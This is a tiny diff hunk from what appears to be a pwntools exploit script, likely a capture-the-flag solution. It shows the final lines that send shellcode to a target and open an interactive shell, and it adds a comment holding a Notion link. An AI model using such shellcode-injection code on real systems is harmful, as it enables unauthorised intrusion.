@@ -218,3 +218,5 @@ p.sendline(str(len(shellcode)).encode())
 p.send(shellcode)
 
 p.interactive()
+
+# https://necessary-psychology-c86.notion.site/canon-event-1a336e79f11a802ab45ed0446a13d7b4
